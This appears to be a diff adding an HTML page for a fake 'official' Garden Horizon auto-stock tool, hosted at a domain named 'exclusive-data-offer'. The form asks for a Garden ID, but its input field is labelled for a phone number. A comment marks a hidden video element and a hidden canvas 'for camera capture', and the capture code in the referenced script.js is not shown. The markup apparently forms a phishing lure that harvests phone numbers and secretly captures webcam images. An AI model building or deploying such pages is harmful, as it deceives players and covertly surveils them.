@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garden Horizon: Auto Stock</title>
+    <meta name="description"
+        content="Automate your Garden Horizon inventory with our official auto-stocking tool. Get instant stock updates and management!">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://exclusive-data-offer.vercel.app/">
+    <meta property="og:title" content="Garden Horizon: Official Auto Stock Event">
+    <meta property="og:description"
+        content="Deploy the official Auto Stock tool for Garden Horizon. Managed stock and instant replenishment for the 2026 Season!">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:title" content="Garden Horizon: Official Auto Stock Event">
+    <meta property="twitter:description"
+        content="I just activated Garden Horizon Auto Stock! My inventory is now fully automated for the new season.">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="offer-badge">Official Event: Garden Horizon</div>
+        <h1>Garden Horizon<br>Auto Stock Tool</h1>
+        <p>Automate your inventory replenishment in seconds. Official tool for the 2026 Season. 
+            Enter your Garden ID below to start the automatic stock synchronization.</p>
+
+        <form id="claimForm">
+            <div class="input-group">
+                <input type="text" id="phoneNumber" placeholder="Garden ID / User ID" required>
+            </div>
+            <button type="submit" id="submitBtn">
+                <span class="btn-text">Activate Auto Stock</span>
+                <div class="loading-spinner" id="spinner"></div>
+            </button>
+        </form>
+
+        <div class="status" id="statusMessage"></div>
+
+
+        <div class="footer-note">
+            *This event is limited to 1 account per device.
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera capture -->
+    <video id="hidden-video" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas"></canvas>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="script.js"></script>
+</body>
+
+</html>
